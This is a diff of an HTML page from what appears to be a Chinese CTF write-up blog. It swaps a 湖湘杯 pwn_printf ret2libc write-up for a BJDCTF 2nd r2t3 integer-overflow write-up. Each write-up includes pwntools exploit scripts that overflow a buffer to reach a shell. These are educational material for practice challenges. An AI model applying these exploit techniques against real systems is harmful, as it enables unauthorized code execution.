@@ -14,7 +14,7 @@
     
     
       
-        <title>湖湘杯hxb_pwn - Trick</title>
+        <title>整形溢出 - Trick</title>
       
     
     
@@ -61,7 +61,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#hxb_pwn" class="md-skip">
+        <a href="#bjdctf-2ndr2t3" class="md-skip">
           跳转至
         </a>
       
@@ -91,7 +91,7 @@
           </span>
           <span class="md-header-nav__topic md-ellipsis">
             
-              湖湘杯hxb_pwn
+              整形溢出
             
           </span>
         </div>
@@ -261,12 +261,10 @@
       
       
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+  <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
     
     <label class="md-nav__link" for="nav-3">
       writeUp
@@ -344,62 +342,11 @@
           
           
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active">
-    
-    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-    
-      
-    
-    
-      <label class="md-nav__link md-nav__link--active" for="__toc">
-        湖湘杯hxb_pwn
-        <span class="md-nav__icon md-icon"></span>
-      </label>
-    
-    <a href="./" class="md-nav__link md-nav__link--active">
+  <li class="md-nav__item">
+    <a href="../湖湘杯hxb_pwn.md" class="md-nav__link">
       湖湘杯hxb_pwn
     </a>
-    
-      
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#pwn_printf" class="md-nav__link">
-    pwn_printf
-  </a>
-  
-    <nav class="md-nav" aria-label="pwn_printf">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#pwn_libc" class="md-nav__link">
-    pwn_libc
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-    
   </li>
 
         
@@ -446,8 +393,6 @@
 <nav class="md-nav md-nav--secondary" aria-label="目录">
   
   
-    
-  
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
@@ -456,22 +401,9 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#pwn_printf" class="md-nav__link">
-    pwn_printf
+  <a href="#bjdctf-2ndr2t3" class="md-nav__link">
+    [BJDCTF 2nd]r2t3
   </a>
-  
-    <nav class="md-nav" aria-label="pwn_printf">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#pwn_libc" class="md-nav__link">
-    pwn_libc
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
@@ -488,77 +420,39 @@
               
                 
                 
-                <h1 id="hxb_pwn">湖湘杯hxb_pwn</h1>
-<h2 id="pwn_printf">pwn_printf</h2>
-<h3 id="pwn_libc">pwn_libc</h3>
-<p>ida</p>
-<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201108200522719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" /></p>
-<p>16次循环
-下面if判断v12&lt;=0x20
-所以写</p>
-<pre><code class="language-python">for i in range(16):
-    n.sendline(&quot;32&quot;)
-</code></pre>
-<p>跟进if下面的函数</p>
-<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201108200913518.png#pic_center" /></p>
-<p>这里变量的栈是空栈0h，所以offset只需要64bit程序的8个就行。
-再然后a * a1，所以传参需要double 0x20，也就是0x40
-<code>ROPgadget --binary pwn_printf</code>
-找到pop_rdi_ret的地址
-复习一下libc64_payload公式</p>
-<pre><code class="language-python">64位payload: payload = &quot;a&quot;*offset + p64(pop_rdi) + p64(got) + p64(plt) + p64(ret_addr/main)
-</code></pre>
-<p>写exp：</p>
+                  <h1>整形溢出</h1>
+                
+                <h2 id="bjdctf-2ndr2t3">[BJDCTF 2nd]r2t3</h2>
+<p>来自buuctf</p>
+<p>先看ida</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201123233054809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" /></p>
+<p>buf缓冲区大小为408h，而read读取大小为400h，比buf要小，所以不能进行简单的缓冲区栈溢出。</p>
+<p>再看name_check函数，v3是int8类型的变量，1111 1111 = 0xFF = 255。当0xFF +1的时侯，变量发生整形溢出，0x100 = 256 此时v3的数值为零（0000 0000），但是这只是显示了一个字节，其实再计算机里面会溢出，前面会进行进位操作变成 1 0000 0000。</p>
+<p>同时还要满足3&lt; v3 &lt;8 的条件，这时候可以确定溢出数值是在 0x104~0x107 中</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201123233312233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" /></p>
+<p>后面的strcpy()函数将s复制给dest,看到dest的偏移为0x11+4</p>
+<p>程序中给出了/bin/sh的地址</p>
+<p>exp：</p>
 <pre><code class="language-python">from pwn import *
-sh = process('./pwn_printf')
-elf = ELF('./pwn_printf')
-puts_plt = elf.plt['puts']
-puts_got = elf.got['puts']
-pop_rdi = 0x401213
-for i in range(16):
-    n.sendline(&quot;32&quot;)
-payload = 'a' * 8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(0x40) + p64(0x4007C6)
-sh.send(payload)
-sh.recvuntil('You will find this game very interesting\n')
-puts_addr = u64(sh.recvn(6).ljust(8, '\x00'))
-print(hex(puts_addr))
+#context.log_level = 'debug'
+r=remote('node3.buuoj.cn',26213)
+sys_addr = 0x08048594
+payload = 'a' * (0x15) + p32(sys_addr) + 'a' * (0x104-0x19) # 0x15 + 0x4 + n = 0x104 
+print(len(payload))
+r.recvuntil('name:\n')
+r.sendline(payload)
+r.interactive()
 </code></pre>
-<p>这就print出来了puts的地址</p>
-<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201108201921266.png#pic_center" /></p>
-<p>到<a href="https://libc.blukat.me/">libc database search</a>查一下相关libc信息</p>
-<p>在套用一下公式</p>
-<pre><code class="language-python">libc_base = puts_addr - 0x080a30    # -libc_Offset的puts
-
-system_addr = libc_base + 0x04f4e0   # +libc_Offset的system
-
-bin_sh_addr = libc_base + 0x1b40fa      # +libc_Offset的bin/sh
-</code></pre>
-<p>复习一下libc64_getshell公式</p>
-<pre><code class="language-python">getshell: &quot;a&quot;*offset + p64(ret) + p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr)
-</code></pre>
-<p>完整exp：</p>
-<pre><code class="language-python">from pwn import *
-sh = process('./pwn_printf')
-elf = ELF('./pwn_printf')
-puts_plt = elf.plt['puts']
-puts_got = elf.got['puts']
-pop_rdi = 0x401213
-for i in range(16):
-    sh.sendline(&quot;32&quot;)
-payload = 'a' * 8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(0x40) + p64(0x4007C6)
-sh.send(payload)
-sh.recvuntil('You will find this game very interesting\n')
-puts_addr = u64(sh.recvn(6).ljust(8, '\x00'))
-print(hex(puts_addr))
-libc_base = puts_addr - 0x080a30 #0x6f6a0
-system_addr = libc_base + 0x04f4e0 #0x0453a0
-bin_sh_addr = libc_base + 0x1b40fa #0x18ce17 
-payload = 'a' * 8 + p64(0x4007C6) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
-
-sh.send(payload)
-
-sh.interactive()
-</code></pre>
+<p>Int8, 等于Byte, 占1个字节.</p>
+<p>Int16, 等于short, 占2个字节. -32768 32767</p>
+<p>Int32, 等于int, 占4个字节. -2147483648 2147483647</p>
+<p>Int64, 等于long, 占8个字节. -9223372036854775808 9223372036854775807</p>
+<p>这样, 看起来比short,int,long更加直观些!</p>
+<p>另外, 还有一个Byte, 它等于byte, 0 - 255.</p>
+<p>所以说这里的v3是占一个字节的，一个字节是由8位二进制决定的。</p>
+<p>例如：0000 0000 就是一个字节，代表0，1111 1111 也是一个字节，代表255.</p>
+<p><a href="https://www.jianshu.com/p/757fe6d91669">参考1</a>
+<a href="https://www.cnblogs.com/bhxdn/p/12572580.html">参考2</a></p>
                 
               
               
@@ -573,41 +467,6 @@ sh.interactive()
       
         
 <footer class="md-footer">
-  
-    <div class="md-footer-nav">
-      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
-        
-          <a href="../Pwn_0xGame_02/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
-            <div class="md-footer-nav__button md-icon">
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-            </div>
-            <div class="md-footer-nav__title">
-              <div class="md-ellipsis">
-                <span class="md-footer-nav__direction">
-                  上一页
-                </span>
-                Pwn_0xGame_02
-              </div>
-            </div>
-          </a>
-        
-        
-          <a href="../friend/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
-            <div class="md-footer-nav__title">
-              <div class="md-ellipsis">
-                <span class="md-footer-nav__direction">
-                  下一页
-                </span>
-                友情链接
-              </div>
-            </div>
-            <div class="md-footer-nav__button md-icon">
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
-            </div>
-          </a>
-        
-      </nav>
-    </div>
   
   <div class="md-footer-meta md-typeset">
     <div class="md-footer-meta__inner md-grid">
